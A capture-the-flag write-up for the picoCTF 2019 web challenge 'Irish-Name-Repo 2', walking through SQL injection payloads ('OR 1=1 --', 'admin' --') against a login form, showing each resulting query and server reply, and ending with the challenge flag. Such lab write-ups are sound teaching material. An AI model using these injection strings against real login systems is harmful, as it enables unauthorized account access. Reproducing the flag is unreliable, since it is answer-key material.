# Irish-Name-Repo 2

> There is a website running at ``https://2019shell1.picoctf.com/problem/41025/`` ([link](https://2019shell1.picoctf.com/problem/41025/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://2019shell1.picoctf.com:41025

> Hints: The password is being filtered.

First things first, we try the same injection we did last time in [Irish-Name-Repo 1](/problems/Irish-Name-Repo_1).
<pre>
username: ' OR 1=1 --
password: something random
SQL query: SELECT * FROM users WHERE name='' OR 1=1 --' AND password='something random'
<h1>SQLi detected.</h1>
</pre>
Darn: It's detecting something in the username that does not pass the check. Quickly, we check if we can run the injection at all by removing the helpful ``OR`` statement.
<pre>
username: ' --
password: something random
SQL query: SELECT * FROM users WHERE name='' --' AND password='something random'
<h1>Login failed.</h1>
</pre>
This is passing the filter, so we can indeed do some injection. Now, running through some [standard injections](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/), we find the idea ``admin' --``, which tries to abuse the fact that our current injection ``' --`` causes the ``password`` check to be completely bypassed:
```sql
SELECT * FROM users WHERE name='' --' AND password='something random'
```
So if the admin's username is ``admin``, the suggested injection ``admin' --`` will return the ``admin`` user without having to check the pesky password.
```sql
SELECT * FROM users WHERE name='admin' --' AND password='something random'
```
Testing this gives the flag.
<pre>
username: admin' --
password: something random
SQL query: SELECT * FROM users WHERE name='admin' --' AND password='something random'
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_83dad972}</p>
</pre>
> ``picoCTF{m0R3_SQL_plz_83dad972}``
